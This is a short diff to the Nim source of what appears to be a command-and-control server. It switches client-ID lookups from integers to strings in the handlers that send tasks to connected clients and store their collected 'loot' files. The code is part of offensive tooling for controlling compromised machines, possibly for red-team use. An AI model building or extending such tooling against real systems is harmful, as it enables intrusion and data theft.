@@ -32,7 +32,7 @@ proc processMessages(server: C2Server, tcpSocket: AsyncSocket) {.async.} =
       case event:
       of "sendtask":
         discard await sendClientTask(
-          server.getClientById(j["clientId"].getInt()),
+          server.getClientById(j["clientId"].getStr()),
           j["taskName"].getStr(),
           j["taskParams"]  
         )
@@ -40,7 +40,7 @@ proc processMessages(server: C2Server, tcpSocket: AsyncSocket) {.async.} =
         let fileName = j["file"].getStr()
         let lootType: LootType = parseEnum[LootType](j["lootType"].getStr())
         let rootDirectory = getLootDirectory(
-          server.getClientById(j["clientId"].getInt())
+          server.getClientById(j["clientId"].getStr())
         ) 
         var filePath: string = ""
         case lootType:
